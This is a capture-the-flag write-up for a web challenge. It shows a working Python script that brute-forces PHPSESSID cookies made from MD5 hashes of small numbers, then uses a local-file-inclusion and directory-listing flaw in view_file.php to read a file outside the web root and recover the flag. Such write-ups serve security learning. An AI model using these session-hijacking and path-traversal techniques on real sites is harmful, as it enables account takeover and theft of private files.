## Recon
Upon loading the site, we are greeted with a page prompting us to `intercept`:

Doing so leads us to another page: `guest.php` which hints at cookies

```
Dear Jones,

I hope this message finds you well. We have a critical situation regarding the upcoming special event for the President. As you know, the President has a particular fondness for a certain sweet treat we prepare. Unfortunately, I seem to have misplaced the recipe for our most popular confection.

I need you to urgently send me the list of ingredients and steps for this signature delight. Itâ€™s the one that everyone raves about, usually paired with afternoon tea. Your quick response is essential, as I need to start preparations immediately.

Best regards,
Chef Anderson
```

Note: we got to this page through a redirect on the `home.php` page.

## Cookies
If we have a look at our cookies we notice we only have a `PHPSESSID` cookie:
`b0b183c207f46f0cca7dc63b2604f5cc`. This cookie changes for each interception.

Googling this cookie (and luck) reveals it is the `md5` hash of `837`.

We can try every number hash to find a weak cookie:

```python
from requests import Session
from tqdm import trange
from hashlib import md5

HOST = "challenges.challenge-ecw.eu"
PORT = "39040"
BASE = f"http://{HOST}:{PORT}/"


for i in trange(0, 1000):
    phpsessid = md5(str(i).encode()).hexdigest()

    s = Session()
    s.cookies.set(
        "PHPSESSID",
        phpsessid,
    )

    response = s.post(BASE + "home.php", allow_redirects=False)
    if response.headers["Location"] != "guest.php":
        print(i)
        print(phpsessid)
        break
```

This provides us with an interesting cookie: `cee631121c2ec9232f3a2f028ad5c89b` which is the `md5` hash of `500`.

## The admin interface
Setting this cookie as our `PHPSESSID` in Burp's browser, we are able to navigate the admin interface:
![](./DeepDive_Interception/admin.png)

The recipe page provides only a partial flag:
```
- 85 g of soft butter
- 1 egg
- ECW{S@cUr3_yOur_C0ok13s_
```

Interestingly, the `edit profile` page allows us to upload a profile picture:
![](./DeepDive_Interception/upload.png)

After uploading a generic PNG image and checking the path were it was uploaded we get this:
`view_file.php?folder=uploads&file=profile.png`

Checking for local file inclusion, I visited:
`http://challenges.challenge-ecw.eu:39040/view_file.php?folder=.&file=view_file.php`

And got the source of the PHP script! Interestingly, we notice that omitting the file argument reveals all the contents of a directory:

```php
if ($folder && !$file) {
    $files = list_files($folder);
    if ($files) {
        $content = "<ul>";
        foreach ($files as $file) {
            $content .= "<li><a href='?folder=" . urlencode($folder) . "&file=" . urlencode(basename($file)) . "'>" . htmlspecialchars(basename($file)) . "</a></li>";
        }
        $content .= "</ul>";
    } else {
        $content = "Failed to open directory.";
    }
}
```

After exploration, the  `.`  directory contains nothing of interest
```
admin.php
guest.php
home.php
img
index.php
js
profile.php
profile_data.json
recipe.php
uploads
view_file.php
```

Listing files in `..` reveals:
```
index.nginx-debian.html
public
src
super_secret.txt
```

We can finally get the second part of the flag:
`http://challenges.challenge-ecw.eu:39040/view_file.php?folder=..&file=super_secret.txt`

```
6Jw91wsMmD}
```

Flag:
`ECW{S@cUr3_yOur_C0ok13s_6Jw91wsMmD}`

> I believe this challenge can also be solved with a file upload vulnerability
